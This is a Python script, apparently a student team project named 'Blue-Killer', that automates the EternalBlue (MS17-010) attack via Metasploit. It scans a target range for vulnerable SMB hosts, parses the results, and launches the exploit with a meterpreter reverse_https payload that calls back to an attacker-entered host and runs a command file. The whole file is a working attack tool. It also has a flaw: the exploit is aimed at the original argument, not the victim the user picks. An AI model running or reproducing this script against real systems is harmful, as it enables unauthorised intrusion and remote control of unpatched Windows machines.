#!/usr/bin/env python3

import os
import sys
import socket
import re


if len(sys.argv) == 1:
    print(r'''

 ____  _                      _  ___ _ _           
| __ )| |_   _  ___          | |/ (_) | | ___ _ __ 
|  _ \| | | | |/ _ \  _____  | ' /| | | |/ _ \ '__|
| |_) | | |_| |  __/ |_____| | . \| | | |  __/ |   
|____/|_|\__,_|\___|         |_|\_\_|_|_|\___|_|   
                                                 

Usage: python3 blue-exploit-team2.py <target ip>
    	''')
    sys.exit()



print(r'''

 ____  _                      _  ___ _ _           
| __ )| |_   _  ___          | |/ (_) | | ___ _ __ 
|  _ \| | | | |/ _ \  _____  | ' /| | | |/ _ \ '__|
| |_) | | |_| |  __/ |_____| | . \| | | |  __/ |   
|____/|_|\__,_|\___|         |_|\_\_|_|_|\___|_|   
                                                 

  
Team 2 Members:
1.  Muhammed Ashique - TEAM LEADER 
2.  Nishal
3.  Vishnu TP
4.  Deepu 
5.  Jazzam
6.  Sreehari
7.  Minhaj
8.  Jithin
9.  Arathi
10. Jithun
11. Kiran
12. Midlaj
13. Fahad
14. Muhsin
15. Shan
16. Sourav 
17. Aslam
18. Tomstan 
19. Venus 
20. Vishnu Prasad 
''')





def get_local_ip():
    ip = input("Enter LHOST : ")
    return ip

def attack(victim, spool_log, local_ip, command_file):
    attack_cmd = f'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; spool {spool_log}; set RHOST {victim}; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {local_ip}; set AutoRunScript multi_console_command -r {os.path.join(os.getcwd(), command_file)}; show options; run;"'
    print(attack_cmd)
    os.system(attack_cmd)

def parse_scan_log(scan_log):
    ip_vuln = []
    scannerFile = open(scan_log, "r")

    for line in scannerFile.readlines():
        if "Host is likely VULNERABLE" in line:
            get_ip = re.findall("[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", line)
            ip_vuln.append(get_ip[0])

    print(ip_vuln)
    return ip_vuln

if __name__ == '__main__':
    try:
        ip_vuln = []
        if len(sys.argv) != 2:
            print("Expected one argument, found " + str(len(sys.argv) - 1))
            sys.exit()

        victims = sys.argv[1]
        scan_log = "scanner.log"
        spool_log = "spool.log"
        command_file = "commands.rc"
        scan_cmd = f'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {victims}; show options; run; exit" | tee {scan_log}'
        local_ip = get_local_ip()

        print("victim IP Address:", victims)
        print("Attacker IP address:", local_ip)
        print("Detecting vulnerable victims...")
        print(scan_cmd)

        os.system(scan_cmd)

        ip_vuln = parse_scan_log(scan_log)

        if not ip_vuln:
            print("No vulnerable victims")
            sys.exit()

        print("Found victims...")

        while True:
            print("Choose vulnerable victim")
            for i, ip in enumerate(ip_vuln):
                print(f"{i+1}) {ip}")

            result = input("Enter a number: ")
            try:
                num =int(result)
                if 1 <= num <= len(ip_vuln):
                    target = ip_vuln[num - 1]
                    break
                print("Invalid input, try again")
            except ValueError:
                print("Invalid input, try again")

        print(f"Attacking victim  IP: {target}")
        attack(victims, spool_log, local_ip, command_file)
    except KeyboardInterrupt:

        print("\n\n")
        while True:
            back = input("Do you want to quit? (y/n) ")
            if back.lower() == 'n':
                break
            elif back.lower() == 'y':
                sys.exit()
            else:
                print("Invalid response, try again")

